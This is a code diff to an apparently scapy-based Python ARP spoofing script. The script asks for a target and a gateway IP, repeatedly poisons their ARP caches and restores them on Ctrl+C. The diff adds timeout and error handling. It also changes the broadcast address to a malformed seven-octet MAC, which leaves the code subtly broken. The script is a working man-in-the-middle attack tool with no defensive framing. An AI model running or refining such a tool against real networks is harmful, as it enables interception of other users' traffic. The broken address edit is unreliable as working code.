@@ -32,14 +32,17 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
 
     answered_list = scapy.srp(
         arp_request_broadcast,
-        timeout=1,
+        timeout=2,
         verbose=False
     )[0]
+
+    if not answered_list:
+        raise RuntimeError(f"No ARP reply received from {ip}. Is it online and on the same network?")
 
     return answered_list[0][1].hwsrc
 
@@ -66,19 +69,11 @@ def restore(destination_ip, source_ip):
 try:
     target_ip = input("[+] Enter your target IP: ").strip()
     gateway_ip = input("[+] Enter the gateway IP (your router's IP): ").strip()
-except KeyboardInterrupt:
-    print("\n[-] Detected ctrl+c... Exiting without changes...")
-    sys.exit(0)
 
+    print("\n[+] Spoofing your target " + target_ip + "....")
+    time.sleep(1)
+    print("[+] Sending packets.....")
 
-time.sleep(2)
-print("\n[+] Spoofing your target " + target_ip + "....")
-time.sleep(2)
-print("[+] Sending packets.....")
-time.sleep(2)
-print("\n")
-
-try:
     sent_packets_count = 0
     while True:
         spoof(target_ip, gateway_ip)
@@ -88,16 +83,20 @@ try:
         time.sleep(2)
 
 except KeyboardInterrupt:
-    print("\n\n[-] Detected ctrl+c...")
-    time.sleep(2)
-    print("[-] Resetting ARP Tables.....")
+    print("\nDetected ctrl+c...")
+    time.sleep(1)
+    print("Resetting ARP Tables.....")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
-    time.sleep(2)
-    print("[+] Original ARP Tables are set....")
-    time.sleep(2)
-    print("[+] Spoofing completed successfully...")
+    time.sleep(1)
+    print("Original ARP Tables are set....")
+    time.sleep(1)
+    print("Spoofing completed successfully...")
     sys.exit(0)
+
+except Exception as e:
+    print("\n[-] " + str(e))
+    sys.exit(1)
 
 finally:
     termios.tcsetattr(fd, termios.TCSANOW, old_settings)
